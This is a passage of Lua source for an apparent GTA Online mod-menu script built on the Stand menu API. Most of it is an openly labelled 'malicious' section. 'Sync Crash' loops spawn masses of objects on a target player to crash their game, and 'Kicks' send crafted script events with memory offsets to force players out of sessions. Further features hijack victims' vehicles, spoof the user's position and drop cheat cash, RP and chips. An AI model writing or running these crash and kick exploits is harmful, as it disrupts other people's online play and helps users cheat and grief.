    ENTITY.SET_ENTITY_VELOCITY(object, math.random(-10, 10), math.random(-10, 10), math.random(30, 50))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, object, 0, 0, -1, 2.5, 0, 180, 0, 0, false, true, false, 0, true)
    util.yield(300)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cord.x, cord.y, cord.z + 1, cord.x, cord.y, cord.z, 0, true, util.joaat("weapon_heavysniper_mk2"), players.user_ped(), false, true, 1.0)
    ENTITY.DETACH_ENTITY(object, object)
    entities.delete_by_handle(object)
    menu.trigger_commands("clearworld")
    menu.trigger_commands("clearworld")
end)

menu.toggle_loop(crashes, "Sync Crash v2", {"crashv78"}, "", function()
    local cord = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
    local object = entities.create_object(util.joaat("prop_off_chair_04"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("prop_parknmeter_01"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("prop_busstop_02"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("prop_bench_11"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("prop_off_chair_01"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("prop_table_06_chr"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_res_kitchnstool"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("hei_int_heist_bath_delta"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, true, true)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(object, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
    ENTITY.SET_ENTITY_ROTATION(object, math.random(0, 360), math.random(0, 360), math.random(0, 360), 0, true)
    ENTITY.SET_ENTITY_VELOCITY(object, math.random(-10, 10), math.random(-10, 10), math.random(30, 50))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, object, 0, 0, -1, 2.5, 0, 180, 0, 0, false, true, false, 0, true)
    util.yield(300)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cord.x, cord.y, cord.z + 1, cord.x, cord.y, cord.z, 0, true, util.joaat("weapon_heavysniper_mk2"), players.user_ped(), false, true, 1.0)
    ENTITY.DETACH_ENTITY(object, object)
    entities.delete_by_handle(object)
    menu.trigger_commands("clearworld")
    menu.trigger_commands("clearworld")
end)

menu.toggle_loop(crashes, "Sync Crash v3", {"crashv79"}, "", function()
    local cord = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
    local object = entities.create_object(util.joaat("docktrailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("docktug"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("trailers2"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("tvtrailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("trfla"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("hei_prop_carrier_trailer_01"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("cs2_02_temp_trailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("tr_prop_tr_truktrailer_01a"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("trailer_casting"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("trailer_casting_in"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("dubsta"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("hydra"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("sm_prop_smug_havok"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("dt1_11_helipor"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("dt1_11_heliport_s"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("sf_prop_sf_heli_blade_b_02a"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("w_ex_snowball"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("w_ex_apmine"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("w_lr_homing_rocket"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("prop_xmas_tree_in"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("prop_xmas_ex"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_31a_jh_tunn_03aextra"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("issi8"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("kosatka"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, true, true)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(object, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
    ENTITY.SET_ENTITY_ROTATION(object, math.random(0, 360), math.random(0, 360), math.random(0, 360), 0, true)
    ENTITY.SET_ENTITY_VELOCITY(object, math.random(-10, 10), math.random(-10, 10), math.random(30, 50))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, object, 0, 0, -1, 2.5, 0, 180, 0, 0, false, true, false, 0, true)
    util.yield(300)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cord.x, cord.y, cord.z + 1, cord.x, cord.y, cord.z, 0, true, util.joaat("weapon_heavysniper_mk2"), players.user_ped(), false, true, 1.0)
    ENTITY.DETACH_ENTITY(object, object)
    entities.delete_by_handle(object)
    menu.trigger_commands("clearworld")
    menu.trigger_commands("clearworld")
end)

-------------------------------------------------------------------------------------------------------------------------------------------------------

local kicks = menu.list(malicious, "Kicks", {}, "")

    menu.action(kicks, "Adaptive Kick", {}, "", function()
        menu.trigger_commands("scripthost")
        util.trigger_script_event(1 << player_id, {1104117595, player_id, 1, 0, 2, 14, 3, 1})
        util.trigger_script_event(1 << player_id, {1104117595, player_id, 1, 0, 2, 167, 3, 1})
        util.trigger_script_event(1 << player_id, {1104117595, player_id, 1, 0, 2, 257, 3, 1})
        menu.trigger_commands("loveletterkick" .. players.get_name(player_id))
    end)

    menu.action(kicks, "Script Kick", {}, "", function()
        util.trigger_script_event(1 << player_id, {1104117595, player_id, 1, 0, 2, math.random(14, 267), 3, 1})
        util.trigger_script_event(1 << player_id, {697566862, player_id, 0x4, -1, 1, 1, 1})
        util.trigger_script_event(1 << player_id, {1268038438, player_id, memory.script_global(2657589 + 1 + (player_id * 466) + 321 + 8)}) 
        util.trigger_script_event(1 << player_id, {915462795, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
        util.trigger_script_event(1 << player_id, {697566862, player_id, 0x4, -1, 1, 1, 1})
        util.trigger_script_event(1 << player_id, {1268038438, player_id, memory.script_global(2657589 + 1 + (player_id * 466) + 321 + 8)})
        util.trigger_script_event(1 << player_id, {915462795, players.user(), memory.read_int(memory.script_global(1894573 + 1 + (player_id * 608) + 510))})
        menu.trigger_commands("givesh" .. players.get_name(player_id))
    end)

    menu.action(kick, "Boop Kick", {"boop"}, "Contains 6 SE kicks.", function()
        menu.trigger_commands("kick" .. players.get_name(player_id))
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        util.trigger_script_event(1 << player_id, {697566862, player_id, 0x4, -1, 1, 1, 1}) --697566862 Give Collectible
        util.trigger_script_event(1 << player_id, {1268038438, player_id, memory.script_global(2657704 + 1 + (player_id * 466) + 321 + 8)}) 
        util.trigger_script_event(1 << player_id, {915462795, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
        util.trigger_script_event(1 << player_id, {697566862, player_id, 0x4, -1, 1, 1, 1})
        util.trigger_script_event(1 << player_id, {1268038438, player_id, memory.script_global(2657704 + 1 + (player_id * 466) + 321 + 8)})
        util.trigger_script_event(1 << player_id, {915462795, players.user(), memory.read_int(memory.script_global(1895156 + 1 + (player_id * 608) + 510))})
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(kick, "Array Kick", {"arraykick"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {1613825825, 20, 1, -1, -1, -1, -1, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {1613825825, 20, 1, -1, -1, -1, -1})
        end
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {1613825825, 20, 1, -1, -1, -1, -1, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {1613825825, 20, 1, -1, -1, -1, -1})
            util.yield(100)
        end
    end)

    menu.action(kicks, "Power Kick", {}, "", function()
        Fewd.power_kick(player_id)
    end)

    local pclpid = {}
    
    menu.action(trolling, "Create Clone", {}, "Creates A Clone Of The Player", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
        pclpid [#pclpid + 1] = pclone 
        PED.CLONE_PED_TO_TARGET(p, pclone)
    end)

    menu.action(trolling, "Delete Clones", {"clearclones"}, "", function()
        local entitycount = 0
        for i, object in ipairs(pclpid) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            pclpid[i] = nil
            entitycount += 1
        end
        util.toast("Deleted " .. entitycount .. " Clones")
    end)

    local control_veh
    control_veh = menu.toggle_loop(trolling, "Control Player Vehicle", {}, "It only works on land vehicles.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if not players.exists(player_id) then util.stop_thread() end

        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            util.toast("Player is too far.")
            menu.set_value(control_veh, false)
        return end

        if class == 15 then
            util.toast("Player is in a helicopter.")
            menu.set_value(control_veh, false)
        return end
        
        if class == 16 then
            util.toast("Player is in an airplane.")
            menu.set_value(control_veh, false)
        return end

        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            if PAD.IS_CONTROL_PRESSED(0, 34) then
                while not PAD.IS_CONTROL_RELEASED(0, 34) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                while not PAD.IS_CONTROL_RELEASED(0, 35) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                while not PAD.IS_CONTROL_RELEASED(0, 32) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                while not PAD.IS_CONTROL_RELEASED(0, 33) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                    util.yield()
                end
            end
        else
            util.toast("Player is not in a vehicle.")
            menu.set_value(control_veh, false)
        end
        util.yield()
    end)

    menu.action(friendly, "All Collectibles", {"collects"}, "", function()
        if players.get_script_host() ~= players.user() then
            menu.trigger_commands("neversh ".."off")
        end
        util.toast("Disabled Never Script Host For You")
        util.log("Disabled Never Script Host For You - [All Collectibles]")
        util.yield(1000)
        menu.trigger_commands("scripthost")
        util.yield(1000)
        menu.trigger_commands("givecollectibles" .. players.get_name(player_id))
	end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.toggle_loop(friendly, "Drop Cash Loop", {"cashloop"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if ENTITY.DOES_ENTITY_EXIST(ped) then
            local coords = players.get_position(player_id)
            coords.z = coords.z + 1.5
            local cash = MISC.GET_HASH_KEY("PICKUP_VEHICLE_MONEY_VARIABLE")
            STREAMING.REQUEST_MODEL(cash)
            if STREAMING.HAS_MODEL_LOADED(cash) == false then  
                STREAMING.REQUEST_MODEL(cash)
            end
            OBJECT.CREATE_AMBIENT_PICKUP(1704231442, coords.x, coords.y, coords.z, 0, 2000, cash, false, true)
            util.toast("Cash Dropping To " .. players.get_name(player_id))
            util.yield(3500)
        end
    end)

    ------------------------------------------------------------------------------------------------------------------

    local figures = {
        0x4D6514A3,
        0x748F3A2A,
        0x1A9736DA,
        0x3D1B7A2F,
        0x1A126315,
        0xD937A5E9,
        0x23DDE6DB,
        0x991F8C36
    }

    menu.toggle_loop(friendly, "Drop All Figures Fast", {"figures"}, "", function()
        local coords = players.get_position(player_id)
        coords.z = coords.z + 1.5
        local random_hash
        random_hash = randomObjectFromTable(figures)
        STREAMING.REQUEST_MODEL(random_hash)
        if STREAMING.HAS_MODEL_LOADED(random_hash) == false then  
            STREAMING.REQUEST_MODEL(random_hash)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, random_hash, false, true)
        util.yield(50)
    end)

    ------------------------------------------------------------------------------------------------------------------

    local rp = {
        0x4D6514A3,
        0x748F3A2A,
        0x1A9736DA,
        0x3D1B7A2F,
        0x1A126315,
        0xD937A5E9,
        0x23DDE6DB,
        0x991F8C36
    }

    --The Original Was By Addict Script But I Edited It To Make It Less Aids

    menu.toggle_loop(friendly, "Drop RP (Attach)", {"dropfigures"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if ENTITY.DOES_ENTITY_EXIST(ped) then
            local coords = players.get_position(player_id)
            coords.z = coords.z + 1.5
            local random_hash = randomObjectFromTable(rp)
            STREAMING.REQUEST_MODEL(random_hash)
            if STREAMING.HAS_MODEL_LOADED(random_hash) == false then  
                STREAMING.REQUEST_MODEL(random_hash)
            end
            OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, random_hash, false, true)
            util.yield(1580)
        end
    end)

    ------------------------------------------------------------------------------------------------------------------

    menu.toggle_loop(friendly, "Give Casino Chips", {"dropchips"}, "Idk if its safe for the new DLC", function(toggle)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if ENTITY.DOES_ENTITY_EXIST(ped) then
            local coords = players.get_position(player_id)
            coords.z = coords.z + 1.5
            local card = MISC.GET_HASH_KEY("vw_prop_vw_lux_card_01a")
            STREAMING.REQUEST_MODEL(card)
            if STREAMING.HAS_MODEL_LOADED(card) == false then  
                STREAMING.REQUEST_MODEL(card)
            end
            OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
        end
    end)

    ------------------------------------------------------------------------------------------------------------------

    local gunsnarmour = {
        0x741C684A,
        0x68605A36,
        0x6C5B941A,
        0xD3A39366,
        0x550447A9,
        0xF99E15D0,
        0xF99E15D0,
        0xA421A532,
        0xF33C83B0,
        0xDF711959,
        0xB2B5325E,
        0x85CAA9B1,
        0xB2930A14,
        0xFE2A352C,
        0x693583AD,
        0x1D9588D3,
        0x3A4C2AD2,
        0x4BFB42D1,
        0x4D36C349,
        0x2F36B434,
        0x8F707C18,
        0xA9355DCD,
        0x96B412A3,
        0x9299C95B,
        0x5E0683A1,
        0x2DD30479,
        0x1CD604C7,
        0x7C119D58,
        0xF9AFB48F,
        0x8967B4F3,
        0x3B662889,
        0x2E764125,
        0xFD16169E,
        0xCB13D282,
        0xC69DE3FF,
        0x278D8734,
        0x295691A9,
        0x81EE601E,
        0x88EAACA7,
        0x872DC888,
        0x094AA1CF,
        0xE33D8630,
        0x80AB931C,
        0x6E717A95,
        0x1CD2CF66,
        0x6773257D,
        0x20796A82,
        0x116FC4E6, 
        0xE4BD2FC6,
        0xDE58E0B3,
        0x77F3F2DD,
        0xC02CF125,
        0x881AB0A8,
        0x84837FD7,
        0xF25A01B9,
        0x815D66E8,
        0xFA51ABF5,
        0xC5B72713,
        0x5307A4EC,
        0x9CF13918,
        0x0968339D,
        0xBFEE6C3B,
        0xEBF89D5F,
        0x22B15640,
        0x763F7121,
        0xF92F486C,
        0x602941D0,
        0x31EA45C9,
        0xBED46EC5,
        0x079284A9,
        0x624F7213,
        0xC01EB678,
        0x5C517D97,
        0xBD4DE242,
        0xE013E01C,
        0x6E4E65C2
    }

    --The Original Was By Addict Script But I Edited It To Make It Less Aids

    menu.toggle_loop(friendly, "Drop Guns & Armor", {"dropguns"}, "", function()
        local coords = players.get_position(player_id)
        coords.z = coords.z + 1.5
        local random_hash
        random_hash = randomObjectFromTable(gunsnarmour)
        if STREAMING.HAS_MODEL_LOADED(random_hash) == true then  
            STREAMING.REQUEST_MODEL(random_hash)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(random_hash, coords.x, coords.y, coords.z, 0, 1, random_hash, false, true)
        util.yield(250)
    end)

    ------------------------------------------------------------------------------------------------------------------

    menu.action(friendly, "Win Crimial Damange", {}, "always win the challenge", function()
        local fcartable = {}

        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local defz = c.z
        STREAMING.REQUEST_MODEL(expcar)
        while not STREAMING.HAS_MODEL_LOADED(expcar) do
            STREAMING.REQUEST_MODEL(expcar)
            util.yield()
        end
        STREAMING.REQUEST_MODEL(floorbr)
        while not STREAMING.HAS_MODEL_LOADED(floorbr) do
            STREAMING.REQUEST_MODEL(floorbr)
            util.yield()
        end
        local success, floorcoords
        repeat
            success, floorcoords = util.get_ground_z(c.x, c.y)
            util.yield()
        until success
        floorcoords = floorcoords - 100
        c.z = floorcoords
        local floorrigp = entities.create_object(floorbr, c)
        c.z = defz
        c.z = c.z - 95 
        for i = 1, 22 do
            fcartable[#fcartable + 1] = entities.create_vehicle(expcar, c, 0) 
        end
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(p, c.x, c.y, floorcoords, exp, 100.0, true, false, 1.0) 
        util.yield(500)
        entities.delete_by_handle(floorrigp)
        util.yield(1000)
        
        for i = 1, #fcartable do
            entities.delete_by_handle(fcartable[i]) 
            fcartable[i] = nil
        end
    end)

    menu.toggle_loop(friendly, "Earn Checkpoints", {}, "Win the challenge checkpoints", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        if PED.IS_PED_IN_ANY_VEHICLE(p) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
            RequestControl(veh)
            local dblip = HUD.GET_NEXT_BLIP_INFO_ID(431)
            local cdblip = HUD.GET_BLIP_COORDS(dblip)
            ENTITY.SET_ENTITY_COORDS(veh, cdblip.x, cdblip.y, cdblip.z, false, false, false, false)
            util.yield(1500)
        else
            util.toast(players.get_name(player_id).. " Must be in a vehicle")
        end
    end)

    menu.action(friendly, "Fix Loading Screen", {"fixme"}, "Try to fix player's infinite loading screen by giving him script host and teleporting to nearest apartment.", function()
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        menu.trigger_commands("aptme" .. players.get_name(player_id))
        end, nil, nil, COMMANDPERM_FRIENDLY)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- Player Attach

menu.action(attachc, "Detach", {"detach"}, "unstuck yourself \nDetach Will Not Work When Spectating", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    ENTITY.DETACH_ENTITY(p, false, false)
    ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
    TASK.CLEAR_PED_TASKS(PLAYER.PLAYER_PED_ID())
end)

function play_animstationary(dict, name, duration)
    ped = PLAYER.PLAYER_PED_ID()
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(ped, dict, name, 3.0, 2.0, duration, 3, 1.0, false, false, false)
end

function play_animfreeze(dict, name, duration)
    ped = PLAYER.PLAYER_PED_ID()
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(ped, dict, name, 3.0, 2.0, duration, 2, 1.0, false, false, false)
    --TASK_PLAY_ANIM(Ped ped, char* animDictionary, char* animationName, float blendInSpeed, float blendOutSpeed, int duration, int flag, float playbackRate, BOOL lockX, BOOL lockY, BOOL lockZ)
end

menu.action(attachc, "Attach To Player", {""}, "Partial Synced (Person You Attach To Cannot See You Are Attached To Them)", function()
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), 0, 0.0, 1.0, 1.0, 2.0, 1.0,1, true, true, true, false, 0, true)
end)

menu.action(attachc, "Piggy Back", {""}, "Partial Synced (Person You Attach To Cannot See You Are Attached To Them)", function()
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), 0, -0.058, 0.197, 0.595, 2.0, 1.0,1, true, true, true, false, 0, true)
    play_animstationary("anim@heists@heist_safehouse_intro@phone_couch@male", "phone_couch_male_idle", -1)
end)

menu.action(attachc, "Criss Cross Around Player", {""}, "Partial Synced (Person You Attach To Cannot See You Are Attached To Them)", function()
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), 0, 0.0, 0.55, 1.0, 2.0, 1.0,1, true, true, true, false, 0, true)
    --play_animstationary("switch@michael@tv_w_kids", "001520_02_mics3_14_tv_w_kids_idle_trc", -1)
    play_animstationary("timetable@jimmy@mics3_ig_15@", "idle_a_tracy", -1)
end)


menu.action(attachc, "Criss Cross Around Player v2", {""}, "Partial Synced (Person You Attach To Cannot See You Are Attached To Them)", function()
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), 0, 0.0, 0.35, 1.0, 2.0, 1.0,1, true, true, true, false, 0, true)
    play_animstationary("switch@michael@on_sofa", "base_jimmy", -1)
end)

menu.action(attachc, "Turn Off Position Spoofing", {""}, "Stops Position Spoofing \n(Press Me When Finished With The Below Options)", function()
    menu.trigger_commands("spoofpos ".."off")
    menu.trigger_commands("spoofedposition " .. "0, " .. "0, " .. "0")
end)

menu.toggle_loop(attachc, "Spoof Attach/Auto Teleport", {""}, "Shows You Are Attached/Constantly Teleporting To The Player When Really You Aren't", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    menu.trigger_commands("spoofpos on")
    menu.trigger_commands("spoofedposition " .. tostring(ENTITY.GET_ENTITY_COORDS(p).x) .. ", " .. tostring(ENTITY.GET_ENTITY_COORDS(p).y) .. ", " .. tostring(ENTITY.GET_ENTITY_COORDS(p).z + 2.0))
end)

menu.toggle_loop(attachc, "Auto Teleport", {""}, "Constantly Teleports to The Player", function()
    if players.exists(player_id) then
    menu.trigger_commands("tp " .. PLAYER.GET_PLAYER_NAME(player_id))
    end
end)

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- Vehicle

    menu.action(vehicle, "Kick From Vehicle", {}, "Attempts to kick the player from their vehicle", function()
        local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, true)
        local myveh = PED.GET_VEHICLE_PED_IS_IN(pped, true)
        PED.SET_PED_INTO_VEHICLE(pped, veh, -2)
        util.yield(50)
        Fewd.ChangeNetObjOwner(veh, player_id)
        Fewd.ChangeNetObjOwner(veh, pped)
        util.yield(50)
        PED.SET_PED_INTO_VEHICLE(pped, myveh, -1)
    end)

    menu.action(vehicle, "Repair Vehicle", {"vehrepair"}, "Repair the vehicle", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
            util.toast(players.get_name(player_id) .. " Repaired Vehicle")
        else
            util.toast("Control of the vehicle could not be obtained or the player is not in a vehicle.")
        end
    end)

    menu.toggle_loop(vehicle, "Repair Vehicle Loop", {}, "Repairs They're Vehicle", function()
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
        else
            util.toast("Control of the vehicle could not be obtained or the player is not in a vehicle.")
        end
    end)

    menu.action(vehicle, "Disable Vehicle", {}, "Unblockable by stand '10/02'", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        local is_running = VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(player_vehicle)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(player_vehicle, -10.0)
            util.toast(players.get_name(player_id) .. "Enigne Disabled")
        else
            util.toast("Could not gain control of the vehicle or the player is not in a vehicle")
        end
    end)
		
    menu.toggle_loop(vehicle, "Disable Vehicle Loop", {}, "It's better than stand", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
